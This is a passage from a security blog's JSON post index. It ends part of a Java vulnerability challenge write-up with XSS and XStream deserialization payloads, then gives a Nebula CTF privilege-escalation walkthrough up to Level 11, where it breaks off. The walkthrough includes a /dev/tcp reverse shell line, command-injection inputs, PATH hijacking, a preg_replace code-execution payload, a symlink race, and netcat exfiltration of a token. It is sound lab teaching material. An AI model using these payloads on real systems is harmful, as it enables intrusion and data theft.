SimpleDateFormat(\"EEE MMM d HH:mm:ss zzz yyyy\");      calendar.setTime(parser.parse(request.getParameter(\"current_time\")));      calendar.setTimeZone(x);      Formatter formatter = new Formatter();      String name = StringEscapeUtils.escapeHtml4(request.getParameter(\"name\"));      formatter.format(\"Name of your calendar: \" + name + \" and your current date is: %1$te.%1$tm.%1$tY\", calendar);      PrintWriter pw = response.getWriter();      pw.print(formatter.toString());    } catch(ParseException e) {      response.sendRedirect(\"/\");    }  }}  This code is vulnerable to Reflective XSS due to a format string injection.  User input for name is sanitized against XSS in line 17.  However, the sanitized name is then concatenated into a format string in line 18.  Since calendar is an object, various format specifiers can be used.  The user can inject format specifiers without causing errors.  The format specifier %s calls toString() on elements within the Calendar object.  In line 12, a SimpleTimeZone object is created with user-controlled id.  This SimpleTimeZone object is added to the Calendar object in line 15.  An attacker can inject an XSS payload into name using the format specifier %s.  The payload is then included in the formatted string printed in line 20.  This results in a Reflective XSS vulnerability where the injected script is executed through reflection.Example payload:http://victim.org/?id=&lt;script&gt;alert(1)&lt;/script&gt;&amp;current_time=Thu Jun 18 20:56:02 EDT 2009&amp;name=%shelloChallenge 24 - Nutcrackerpackage com.rips.demo.web; import java.io.*;import java.lang.reflect.*; class Invoker implements Serializable {   private String c;  private String m;  private String[] a;   public Invoker(String c, String m, String[] a) {    this.c = c;    this.m = m;    this.a = a;  }   private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException {    ois.defaultReadObject();    Class clazz = Class.forName(this.c);    Object obj = clazz.getConstructor(String[].class).newInstance(new Object[]{this.a});    Method meth = clazz.getMethod(this.m);    meth.invoke(obj, null);  }} class User implements Serializable {  private String name;  private String email;  transient private String password;   public User(String name, String email, String password) {    this.name = name;    this.email = email;    this.password = password;  }     private void readObject(ObjectInputStream stream)      throws IOException, ClassNotFoundException {    stream.defaultReadObject();    password = (String) stream.readObject();  }   @Override  public String toString() {    return \"User{\" + \"name='\" + name + \", email='\" + email + \"'}\";  }} @RequestMapping(value = \"/unserialize\", consumes = \"text/xml\")  public void unserialize(@RequestBody String xml, HttpServletResponse res) throws IOException, ParserConfigurationException, SAXException, XPathExpressionException, TransformerException {    res.setContentType(\"text/plain\");    // Parse xml string    DocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();    builderFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\",true);    DocumentBuilder builder = builderFactory.newDocumentBuilder();    Document xmlDocument = builder.parse(new InputSource(new StringReader(xml)));    XPath xPath = XPathFactory.newInstance().newXPath();    String expression = \"//com.rips.demo.web.User[@serialization='custom'][1]\";    //only allow User objects to be unserialized!!!    NodeList nodeList = (NodeList) xPath.compile(expression).evaluate(xmlDocument, XPathConstants.NODESET);    // Transform node back to xml string    Transformer transformer = TransformerFactory.newInstance().newTransformer();    transformer.setOutputProperty(OutputKeys.OMIT_XML_DECLARATION, \"yes\");    StringWriter writer = new StringWriter();    transformer.transform(new DOMSource(nodeList.item(0)), new StreamResult(writer));    String xmloutput = writer.getBuffer().toString();    // Unserialze User    User user = (User) new XStream().fromXML(xmloutput);    res.getWriter().print(\"Successfully unserialized \"+user.toString());  }  This code is vulnerable to Object Injection due to insecure deserialization.  User input arrives through the @RequestBody annotation (Spring framework) and is mapped to xml in line 2.  The input is parsed into a DOM document (line 8).  An XPath expression filters for com.rips.demo.web.User nodes with the serialization='custom' attribute (lines 10-12).  The filtered node is then serialized back to a string (line 17) and deserialized (line 20).  Both relevant classes implement Serializable and override default deserialization (lines 18-24, 38-42).  While deserialization reads non-transient fields, the password field is manually read later (line 41).  This allows hiding another object within the User object, bypassing the filter.  The vulnerability is exploited in the readObject method of the Invoker class (line 19).  This method allows creating an arbitrary object and invoking its methods.  An attacker can craft a payload to create a ProcessBuilder object and execute commands (lines shown).&lt;com.rips.demo.web.User serialization=\"custom\"&gt;  &lt;com.rips.demo.web.User&gt;    &lt;default&gt;      &lt;email&gt;peter@gmail.com&lt;/email&gt;      &lt;name&gt;Peter&lt;/name&gt;    &lt;/default&gt;    &lt;com.rips.demo.web.Invoker serialization=\"custom\"&gt;      &lt;com.rips.demo.web.Invoker&gt;        &lt;default&gt;          &lt;a&gt;            &lt;string&gt;touch&lt;/string&gt;            &lt;string&gt;abc&lt;/string&gt;          &lt;/a&gt;          &lt;c&gt;java.lang.ProcessBuilder&lt;/c&gt;          &lt;m&gt;start&lt;/m&gt;        &lt;/default&gt;      &lt;/com.rips.demo.web.Invoker&gt;    &lt;/com.rips.demo.web.Invoker&gt;  &lt;/com.rips.demo.web.User&gt;&lt;/com.rips.demo.web.User&gt;"
  },
  
  {
    "title": "Exploit Education - Nebula Walkthrough",
    "url": "/posts/10_Exploit_Education_Nebula_Walkthrough/",
    "categories": "ctf",
    "tags": "exploit education",
    "date": "2019-09-18 03:25:52 +0800",
    





    
    "snippet": "This blog post contains a walkthrough of Nebula provided by Exploit Education. Nebula is a vulnerable ISO which has a variety of Linux privilege escalation vulnerabilities. Some of these vulnerabil...",
    "content": "This blog post contains a walkthrough of Nebula provided by Exploit Education. Nebula is a vulnerable ISO which has a variety of Linux privilege escalation vulnerabilities. Some of these vulnerabilties includes issues such as SUID files, Permissions, Race conditions etc.After running the ISO, each level can be accessed by sshing into port 22 with the username {level}{levelno}. Instructions regarding each level are also provided within https://exploit.education/nebula/.Level00Link: https://exploit.education/nebula/level-00/The goal of this level is to find a Set User ID program that will run as the “flag00” account. SetUID, which stands for set user ID on execution, is a special type of file permission in Unix which permits users to run certain programs with escalated privileges.In Unix/Linux, the ownership of files and directories is based on the default uid (user-id) and gid (group-id) of the user who created them. When running a program/process within Linux, this process/program has the privilege of the user that ran the program. A SetUID bit can be set on an executable which when executed, will then run under the context of the file owner rather than the user who ran the program. For example, if an executable has the setuid bit set on it, and it’s owned by root, when launched by a normal user, it will run with root privileges.To find all SetUID binaries within a system, the find command can be used with the following arguments:find / -perm -u=s 2&gt;/dev/nullThe / argument is specified to run the command from the top most directory, the -perm option can be used to find files with specific mode. Files with SetUID and SetGID all have different mode numbers. For example, g=w will only match files which have mode 0020 since this is the mode number for files with group write permission set. The -u=s can be used to find files with the mode SetUID set. The /bin/…/flag00 is provided to ignore all stdout errors by sending them to dev/null.level00@nebula:~$ find / -perm -u=s 2&gt;/dev/null/bin/.../flag00/bin/fusermount/bin/mount/bin/ping/bin/ping6/bin/su/bin/umount/sbin/mount.ecryptfs_private/usr/bin/at/usr/bin/chfn/usr/bin/chsh/usr/bin/gpasswd/usr/bin/mtr/usr/bin/newgrp/usr/bin/passwd/usr/bin/sudo/usr/bin/sudoedit/usr/bin/traceroute6.iputils/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/lib/pt_chown/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper/usr/sbin/pppd/usr/sbin/uuidd/rofs/bin/.../flag00/rofs/bin/fusermount/rofs/bin/mount/rofs/bin/ping/rofs/bin/ping6/rofs/bin/su/rofs/bin/umount/rofs/sbin/mount.ecryptfs_private/rofs/usr/bin/at/rofs/usr/bin/chfn/rofs/usr/bin/chsh/rofs/usr/bin/gpasswd/rofs/usr/bin/mtr/rofs/usr/bin/newgrp/rofs/usr/bin/passwd/rofs/usr/bin/sudo/rofs/usr/bin/sudoedit/rofs/usr/bin/traceroute6.iputils/rofs/usr/lib/dbus-1.0/dbus-daemon-launch-helper/rofs/usr/lib/eject/dmcrypt-get-device/rofs/usr/lib/openssh/ssh-keysign/rofs/usr/lib/pt_chown/rofs/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper/rofs/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper/rofs/usr/sbin/pppd/rofs/usr/sbin/uuiddThe /bin/.../flag00 binary can now be run to get the flag.Level01Link: https://exploit.education/nebula/level-01/Level01 provides you with source code of a program that allows arbitrary programs to be executed.#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;int main(int argc, char **argv, char **envp){  gid_t gid;  uid_t uid;  gid = getegid();  uid = geteuid();  setresgid(gid, gid, gid);  setresuid(uid, uid, uid);  system(\"/usr/bin/env echo and now what?\");}Running the binary within the flag01 folder gives the following output.level01@nebula:~$ cd ../flag01level01@nebula:/home/flag01$ ./flag01 and now what?ltrace can be used to debug this binary and understand its functionality. ltrace is a debugging utility which hooks into the dynamic loading system, allowing it to insert shims which display the parameters which the applications uses when making the call, and the return value which the library call reports. It is mainly used to trace Linux system calls.The ltrace output below just explains the source in a functional way where it takes the current uid and gid of the user who executed the binarylevel01@nebula:/home/flag01$ ltrace ./flag01 level01@nebula:/home/flag01$ iduid=1002(level01) gid=1002(level01) groups=1002(level01)__libc_start_main(0x80484a4, 1, 0xbfc49744, 0x8048510, 0x8048580 &lt;unfinished ...&gt;getegid()                                                        = 1002geteuid()                                                        = 1002setresgid(1002, 1002, 1002, 0x288324, 0x287ff4)                  = 0setresuid(1002, 1002, 1002, 0x288324, 0x287ff4)                  = 0system(\"/usr/bin/env echo and now what?\"and now what? &lt;unfinished ...&gt;--- SIGCHLD (Child exited) ---&lt;... system resumed&gt; )                                           = 0+++ exited (status 0) +++Looking at the system call it makes, it is possible to change the path of the echo binary since it is relying on /usr/bin/env to find the full path of the echo binary. The env can be run to see what the PATH environment of a user is, generally it is something like PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games. This output is the list of folders that system checks when a user runs a binary without providing its full path.So complete this challenge, you can change your PATH to be called from an folder that you have write access to such as /home/level01/, and then create a new binary call echo, or a symbolic link which will then execute the getflag binary.Start by creating a file called echo.c within the tmp directory or a directory you have write and execute privileges to and paste the following code:#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(){  system(\"/bin/bash\");}This can then be compiled into a program as seen below.level01@nebula:/tmp$ vi echo.clevel01@nebula:/tmp$ cc echo.c -o echoOnce you have a dummy echo program, you can then change your environment path to the /tmp directory, meaning everytime the system will check if a binary is within the tmp folder since it doesn’t know the full path. Now when running the flag01 binary this will run the dummy echo program and provide you a bash shell under the context of the flag01 user account. Then the getflag command can be executed.Level02Link: https://exploit.education/nebula/level-02/Level 02 provides you with a program which takes a USER from an environment variable using asprintf. asprint is similar to sprintf, except that it dynamically allocates a string to hold the output, instead of putting the output in a buffer you allocate in advance. This is then given to the system function which invokes an operating system command with the provider “USER” variable.#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;int main(int argc, char **argv, char **envp){  char *buffer;  gid_t gid;  uid_t uid;  gid = getegid();  uid = geteuid();  setresgid(gid, gid, gid);  setresuid(uid, uid, uid);  buffer = NULL;  asprintf(&amp;buffer, \"/bin/echo %s is cool\", getenv(\"USER\"));  printf(\"about to call system(\\\"%s\\\")\\n\", buffer);    system(buffer);}Similar to level01, the environment variable can be changed to something like ; /bin/sh which when taken by the program and is executed as part of the system function results in command injection, successfully provided a shell in the context on flag02.Level03Link: https://exploit.education/nebula/level-03/Level03 provides you with the following files. The hint in the challenge page explains that there is a crontab that is called every couple of minutes.level03@nebula:/home/flag03$ la -latotal 6drwxr-x--- 3 flag03 level03  103 2011-11-20 20:39 .drwxr-xr-x 1 root   root     100 2012-08-27 07:18 ..-rw-r--r-- 1 flag03 flag03   220 2011-05-18 02:54 .bash_logout-rw-r--r-- 1 flag03 flag03  3353 2011-05-18 02:54 .bashrc-rw-r--r-- 1 flag03 flag03   675 2011-05-18 02:54 .profiledrwxrwxrwx 2 flag03 flag03     3 2012-08-18 05:24 writable.d-rwxr-xr-x 1 flag03 flag03    98 2011-11-20 21:22 writable.shlevel03@nebula:/home/flag03$ cat writable.sh #!/bin/shfor i in /home/flag03/writable.d/* ; do\t(ulimit -t 5; bash -x \"$i\")\trm -f \"$i\"donelevel03@nebula:/home/flag03$ ls -la writable.d/total 0drwxrwxrwx 2 flag03 flag03    3 2012-08-18 05:24 .drwxr-x--- 3 flag03 level03 103 2011-11-20 20:39 ..Looking through the files, the writable.sh shell script is world-write-executable and iterates through all files provided within the /home/flag03/writable.d directory and runs thats using the bash terminal. The ulimit command before the bash command controls the max processes per user limit. This just sets the get and set user limit to second 5. The -x argument before bash checks to see if a file is executable before executing it.To solve this challenge, you can create a shell script similar to the following#!/bin/sh/bin/getflag &gt;&gt; /home/flag03/writable.d/flag03.outand wait for it to be executed to get the flagAn alternative way to solve this solution is to create a shell script like the following \"bash -i &gt;&amp; /dev/tcp/192.168.1.8/8080 0&gt;&amp;1\" &gt; shell.sh and run nc -lvp 8080 on your machine. When the shell script executes, it will then give you a reverse shell.Level04Link: https://exploit.education/nebula/level-04/Level04 requires you to read the token file, but the below code restricts the files that can be read.#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;int main(int argc, char **argv, char **envp){  char buf[1024];  int fd, rc;  if(argc == 1) {      printf(\"%s [file to read]\\n\", argv[0]);      exit(EXIT_FAILURE);  }  if(strstr(argv[1], \"token\") != NULL) {      printf(\"You may not access '%s'\\n\", argv[1]);      exit(EXIT_FAILURE);  }  fd = open(argv[1], O_RDONLY);  if(fd == -1) {      err(EXIT_FAILURE, \"Unable to open %s\", argv[1]);  }  rc = read(fd, buf, sizeof(buf));    if(rc == -1) {      err(EXIT_FAILURE, \"Unable to read fd %d\", fd);  }  write(1, buf, rc);}The read function takes a system call used to read data into a buffer and the write function is a system call that is used to write data out of a buffer. The strstr is the function that does the check to see whether the file name matches the string “token” and provides an error if it is true. This function searches the given string in the specified main string and returns the pointer to the first occurrence of the given string.An easy way to bypass this check is by creating a symlink which points to the token file and read this file using the flag04 binary: ln -s /home/flag04/token /home/flag04/testLevel05Link: https://exploit.education/nebula/level-05/Level 5 challenge description states that your are looking for weak directory permissions. Going to the flag05 directory and listing the directory for all files, a .backup directory can be seen. Inside this directory contains a .tgz filelevel05@nebula:~$ cd ../flag05/level05@nebula:/home/flag05$ lslevel05@nebula:/home/flag05$ ls -latotal 5drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .drwxr-xr-x 1 root   root     160 2012-08-27 07:18 ..drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profiledrwx------ 2 flag05 flag05    70 2011-11-20 20:13 .sshlevel05@nebula:/home/flag05$ cd .backup/level05@nebula:/home/flag05/.backup$ lsbackup-19072011.tgzExtracting this tape archive file provides an ssh key, this ssh key can be used to ssh into the nebula system as the flag05 user.level05@nebula:/tmp$ tar -xvzf backup-19072011.tgz .ssh/.ssh/id_rsa.pub.ssh/id_rsa.ssh/authorized_keyslevel05@nebula:/tmp$ ssh -i id_rsa flag05@192.168.1.3Level06Link: https://exploit.education/nebula/level-06/This challenge states that the flag06 account credentials came from a legacy unix system.Looking within the flag06 folder, no files can be foundlevel06@nebula:/home/flag06$ ls -latotal 5drwxr-x--- 2 flag06 level06   66 2011-11-20 20:51 .drwxr-xr-x 1 root   root     200 2012-08-27 07:18 ..-rw-r--r-- 1 flag06 flag06   220 2011-05-18 02:54 .bash_logout-rw-r--r-- 1 flag06 flag06  3353 2011-05-18 02:54 .bashrc-rw-r--r-- 1 flag06 flag06   675 2011-05-18 02:54 .profilelevel06@nebula:/home/flag06$ However, since the hint states legacy unix system, the /etc/passwd/ file can be checked.level06@nebula:/home/flag06$ cat /etc/passwd | grep flag06flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/shlevel06@nebula:/home/flag06$ The password hash of the flag06 user can be seen within the passwd file.In legacy unix systems, password hashes of a user used to be stored within the /etc/passwd file, this was then changed because /etc/passwd file are world readable by all users.This password hash can then be cracked using John the ripper.root@kali:~# cat hash.txtflag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/shroot@kali:~# john hash.txt --showflag06:hello:993:993::/home/flag06:/bin/sh1 password hash cracked, 0 leftLevel07Link: https://exploit.education/nebula/level-07/The description for level07 states that a perl cgi script is in use that allows a user to ping hosts to see if they were reachable from a web server. The source of the program has also been provided.Looking at the CGI script, it takes a parameter called “Host” and inserts that as part of the ping command which then gets executed. This script is vulnerable to Command Injection.The httpd config available within the flag07 directory also specifies what port the CGI script is running on.level07@nebula:/home/flag07$ lsindex.cgi  thttpd.conflevel07@nebula:/home/flag07$ cat thttpd.conf # /etc/thttpd/thttpd.conf: thttpd configuration file# This file is for thttpd processes created by /etc/init.d/thttpd.# Commentary is based closely on the thttpd(8) 2.25b manpage, by Jef Poskanzer.# Specifies an alternate port number to listen on.port=7007# Specifies a directory to chdir() to at startup. This is merely a convenience -# you could just as easily do a cd in the shell script that invokes the program.dir=/home/flag07By making a curl request and chaining a command using the &amp;&amp; operator, it is possible to verify the command injection. This can be seen in the output below.snoopy@snoopy-MacBookPro:~/Documents$ curl http://192.168.1.3:7007/index.cgi?Host=127.0.0.1%20%26%26%20whoami&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.024 ms64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.023 ms64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.015 ms--- 127.0.0.1 ping statistics ---3 packets transmitted, 3 received, 0% packet loss, time 1998msrtt min/avg/max/mdev = 0.015/0.020/0.024/0.006 msflag07Level08Link: https://exploit.education/nebula/level-08/Level 08 hints at World readable files being in use. Accessing the flag08 shows that a pcap file is available. This can be downloaded and accessed locally.scp level08@192.168.1.3:/home/flag08/capture.pcap /home/snoopy/Looking at this pcap file within Wireshark, the following can be seen...wwwbugs login: l.le.ev.ve.el.l8.8..Password: backdoor...00Rm8.ateA possible password is displayed, however it looks mangled. It was not possible to loging as flag08 using backdoor…00Rm8.ate and backdoor00Rm8ate. Looking at the TCP/HTTP stream in HEX, the ASCII hex character 7f and Od stands out.By looking up both characters online, it is possible to deduce that 7f is the Delete keyboard character and Od is the keyboard character.So the user typed in ‘backdoor’ then deleted the characters ‘oor’ and the inserted ‘00Rm8’, the character ‘8’ was then removed for ‘a’, making the actual password backd00RmateLevel09Link: https://exploit.education/nebula/level-09/Level 09 provides the following source code.&lt;?phpfunction spam($email){  $email = preg_replace(\"/\\./\", \" dot \", $email);  $email = preg_replace(\"/@/\", \" AT \", $email);    return $email;}function markup($filename, $use_me){  $contents = file_get_contents($filename);  $contents = preg_replace(\"/(\\[email (.*)\\])/e\", \"spam(\\\"\\\\2\\\")\", $contents);  $contents = preg_replace(\"/\\[/\", \"&lt;\", $contents);  $contents = preg_replace(\"/\\]/\", \"&gt;\", $contents);  return $contents;}$output = markup($argv[1], $argv[2]);print $output;?&gt;The above PHP code takes two arguments, $filename and $use_me, However, only the $filename parameter seems to be used. the file mentioned within the filename parameter is then fetched, and is checked to see if a an array called ‘email’ is there, this can be verified by checking the provided regex:This is then ran by the preg_replace command to replace the dot and the @ symbols. Looking online, the following articles mention that preg_replace is vulnerable to command injection.  http://www.madirish.net/402  https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replaceFirst try indicates that the values inserted within the system command is only being echoed back.level09@nebula:/home/flag09$ vi /tmp/file.txt level09@nebula:/home/flag09$ ./flag09 /tmp/file.txtPHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22snoopy AT foo dot com; system(\\'whoami\\')level09@nebula:/home/flag09$ After trying multiple execution operators such as quotes, single quotes, backticks and much research, it looks like when providing a input similar to the below:level09@nebula:/home/flag09$ cat /tmp/execute$str = 'system(whoami)';[email snoopy@foo.com $str] The script provides an error stating undefined variable.level09@nebula:/home/flag09$ ./flag09 /tmp/execute fooPHP Notice:  Undefined variable: str in /home/flag09/flag09.php(15) : regexp code on line 1$str = 'system(whoami)';snoopy AT foo dot com It seems variables cannot be set and cannot be called later on since all of this is being executed within preg_replace and then provided to the spam() function.More research indicated that interpolation templates can be used to define variables: https://stackoverflow.com/questions/43437121/php-string-interpolation-syntax/43437427. An example of this would be something like {$variable}. However, pre_replace is evaling any input, we could just try passing it arbitrary commands.Trying the following payload [email snoopy@foo.com ${‘whoami’}] sets a template as a variable which is the linux command ‘whoami’. However, this returns an error.level09@nebula:/home/flag09$ ./flag09 /tmp/execute aaaPHP Parse error:  syntax error, unexpected T_ENCAPSED_AND_WHITESPACE, expecting T_STRING in /home/flag09/flag09.php(15) : regexp code on line 1PHP Fatal error:  preg_replace(): Failed evaluating code: spam(\"snoopy@foo.com ${\\'whoami\\'}\") in /home/flag09/flag09.php on line 15This error is due to the single quotes in use, that can be replaced with backticks :[email snoopy@foo.com ${`whoami`}]This payloads gets successfully interpreted as a command displayed the user the script is running as which is ‘flag09’.level09@nebula:/home/flag09$ ./flag09 /tmp/execute aaaPHP Notice:  Undefined variable: flag09 in /home/flag09/flag09.php(15) : regexp code on line 1snoopy AT foo dot com &gt;This payload can now be modified to run getflag.Level10Link: https://exploit.education/nebula/level-10/Level10 contains a setuid binary which can upload a file given, but has certain restrictions.#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;errno.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv){  char *file;  char *host;  if(argc &lt; 3) {      printf(\"%s file host\\n\\tsends file to host if you have access to it\\n\", argv[0]);      exit(1);  }  file = argv[1];  host = argv[2];  if(access(argv[1], R_OK) == 0) {      int fd;      int ffd;      int rc;      struct sockaddr_in sin;      char buffer[4096];      printf(\"Connecting to %s:18211 .. \", host); fflush(stdout);      fd = socket(AF_INET, SOCK_STREAM, 0);      memset(&amp;sin, 0, sizeof(struct sockaddr_in));      sin.sin_family = AF_INET;      sin.sin_addr.s_addr = inet_addr(host);      sin.sin_port = htons(18211);      if(connect(fd, (void *)&amp;sin, sizeof(struct sockaddr_in)) == -1) {          printf(\"Unable to connect to host %s\\n\", host);          exit(EXIT_FAILURE);      }#define HITHERE \".oO Oo.\\n\"      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {          printf(\"Unable to write banner to host %s\\n\", host);          exit(EXIT_FAILURE);      }#undef HITHERE      printf(\"Connected!\\nSending file .. \"); fflush(stdout);      ffd = open(file, O_RDONLY);      if(ffd == -1) {          printf(\"Damn. Unable to open file\\n\");          exit(EXIT_FAILURE);      }      rc = read(ffd, buffer, sizeof(buffer));      if(rc == -1) {          printf(\"Unable to read from file: %s\\n\", strerror(errno));          exit(EXIT_FAILURE);      }      write(fd, buffer, rc);      printf(\"wrote file!\\n\");  } else {      printf(\"You don't have access to %s\\n\", file);  }}An example of this can be seen below, where it is possible to send the passwd file of the system to a remote host on port 18211. The port 18211 is specified by the program and cannot be changed. On the remote host, netcat can be used to receive the file (nv -lvl 18211)By analyzing the source code, it can be determined that the linux access function is used for the check. By reading its man page https://linux.die.net/man/2/access and looking at the warning section, it looks like the access function is vulnerable to race conditions. Further research also points to this http://www.cis.syr.edu/~wedu/Teaching/IntrCompSec/LectureNotes_New/Race_Condition.pdfReading the above lecture notes, this program can be exploited by creating a file the user has access to, then create a symbolic link back to the forbidden token file, then the flag10 program can be run multiple times to trigger the race condition.This works because there is a short time window between executing the access() and open() functions. The window between the checking and using the file results in a Time-of-Check/Time-of-Use (TOCTOU) vulnerability. This is because the system might conduct context switch after access(), and run another process which will run as the flag10 user, so if you can read the file then, the token file will be fetched and successfully sent back.level10@nebula:/tmp$ touch /tmp/accessiblefilelevel10@nebula:/tmp$ while true; do ln -sf /home/flag10/token /tmp/token; \\&gt; ln -sf /tmp/accessiblefile /tmp/token; doneThe above bash liner will create a symbolic link for a file between the token we want to access and a file we have access to, this /tmp/token can now be given to the flag10 program. The same approach can be done to run the flag program multiple times with the opportunity to read the token.level10@nebula:/home/flag10$ while true; do ./flag10 /tmp/token 192.168.1.8; doneYou don't have access to /tmp/tokenYou don't have access to /tmp/tokenYou don't have access to /tmp/tokenYou don't have access to /tmp/tokenConnecting to 192.168.1.8:18211 .. Unable to connect to host 192.168.1.8You don't have access to /tmp/tokenOn the host the program is connecting to, netcat can be run with continuous mode by using the -k option.snoopy@snoopy-MacBookPro:~$ sudo nc -klvp 18211Listening on [0.0.0.0] (family 0, port 18211)Connection from 192.168.1.10 51669 received!.oO Oo.615a2ce1-b2b5-4c76-8eed-8aa5c4015c27Connection from 192.168.1.10 51670 received!.oO Oo.615a2ce1-b2b5-4c76-8eed-8aa5c4015c27Connection from 192.168.1.10 51671 received!.oO Oo.615a2ce1-b2b5-4c76-8eed-8aa5c4015c27Connection from 192.168.1.10 51672 received!This token can then be used to SSH as the flag10 user and run the getflag command.Level11Link: https://exploit.education/nebula/level-11/Level 11 provides you with a program that executes a shell command in multiple ways and it is stated that there are two ways of completing this level.#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/mman.h&gt;/* * Return a random, non predictable file, and return the file descriptor for * it.  */int getrand(char **path){  char *tmp;  int pid;  int fd;  srandom(time(NULL));  tmp = getenv(\"TEMP\");  pid = getpid();    asprintf(path, \"%s/%d.%c%c%c%c%c%c\", tmp, pid,      'A' + (random() % 26), '0' + (random() % 10),      'a' + (random() % 26), 'A' + (random() % 26),      '0' + (random() % 10), 'a' + (random() % 26));  fd = open(*path, O_CREAT|O_RDWR, 0600);  unlink(*path);  return fd;}void process(char *buffer, int length){  unsigned int key;  int i;  key = length &amp; 0xff;  for(i = 0; i &lt; length; i++) {      buffer[i] ^= key;      key -= buffer[i];  }  system(buffer);}#define CL \"Content-Length: \"int main(int argc, char **argv){  char line[256];  char buf[1024];  char *mem;  int length;  int fd;  char *path;  if(fgets(line, sizeof(line), stdin) == NULL) {      errx(1, \"reading from stdin\");  }  if(strncmp(line, CL, strlen(CL)) != 0) {      errx(1, \"invalid header\");  }  length = atoi(line + strlen(CL));    if(length &lt; sizeof(buf)) {      if(fread(buf, length, 1, stdin) != length) {          err(1, \"fread length\");      }      process(buf, length);  } else {      int blue = length;      int pink;      fd = getrand(&amp;path);      while(blue &gt; 0) {          printf(\"blue = %d, length = %d, \", blue, length);          pink = fread(buf, 1, sizeof(buf), stdin);          printf(\"pink = %d\\n\", pink);          if(pink &lt;= 0) {              err(1, \"fread fail(blue = %d, length = %d)\", blue, length);          }          write(fd, buf, pink);          blue -= pink;      }          mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);      if(mem == MAP_FAILED) {          err(1, \"mmap\");      }      process(mem, length);  }}The program reads from stdin. The following code block within the main function checks for the value Content Length #define CL “Content-Length: “ along with its length and see if it provided by the user, if these values are not found, then an ‘invalid header’ is produced.if(strncmp(line, CL, strlen(CL)) != 0) {      errx(1, \"invalid header\");  }Looking at the code flow, the program will then check to see if the content length is less than the buffer that was initialized in the beginning of the program. Additonal checks are also conducted with the fread function. The fread function will check the length of the values inserted see if it is 1.      if(fread(buf, length, 1, stdin) != length) {          err(1, \"fread length\");If the length is 1, then the process function is executed. The process function just turns the user input to a random character and feeds it to the system function. This can be tested with the following user input:level11@nebula:/home/flag11$ echo -ne \"Content-Length: 1\\nA\" | /home/flag11/flag11sh: @: command not foundHere we passed the character “A”, when this gets processed by the “process” function, it is converted to the character “@” and is then given to the system command.This can be tried with other characters. With a character such as “l”, it is converted in “m” on most occasions.level11@nebula:~$ echo -ne \"Content-Length: 1\\nl\" | /home/flag11/flag11sh: $'m\\320\\227': command not foundlevel11@nebula:~$ echo -ne \"Content-Length: 1\\nl\" | /home/flag11/flag11sh: m@C: command not foundlevel11@nebula:~$ echo -ne \"Content-Length: 1\\nl\" | /home/flag11/flag11sh: m: command not foundlevel11@nebula:~$ echo -ne \"Content-Length: 1\\nl\" | /home/flag11/flag11sh: $'m\\320\\313': command not foundlevel11@nebula:~$ To summarize this program so far, the content of stdin is taken and mmap is used to convert file content into a char array that is passed into the process() function. The process function then decodes the char array before passing it into the system() function call. I struggled with this level so I ended up looking for hints on the internet. This gave me the following hint:Since the bash shell is trying to execute a program called shell, we could create a C program which takes the correct SUID information of the flag11 account and runs the bash shell with their privileges. This can then be symlinked (like level 10).This technique however didn’t work due to setuid bit not being set before the call to system. I ended up searching for solutions for this level and found the following working solution: Stack Overflow Nebula Level 11Looking the “else” conditional logic, this part of the program can be triggered during the buffer length check.} else {      int blue = length;      int pink;      fd = getrand(&amp;path);      while(blue &gt; 0) {          printf(\"blue = %d, length = %d, \", blue, length);          pink = fread(buf, 1, sizeof(buf), stdin);          printf(\"pink = %d\\n\", pink);          if(pink &lt;= 0) {              err(1, \"fread fail(blue = %d, length = %d)\", blue, length);          }          write(fd, buf, pink);          blue -= pink;      }          mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);      if(mem == MAP_FAILED) {          err(1, \"mmap\");      }      process(mem, length);  }To abuse this logic, we have to define the environment variable from the shell we run the exploit later on. This can be done using the following command.export TEMP=/tmpLooking at the flag11 folder, another possible attack vector would be to inject a 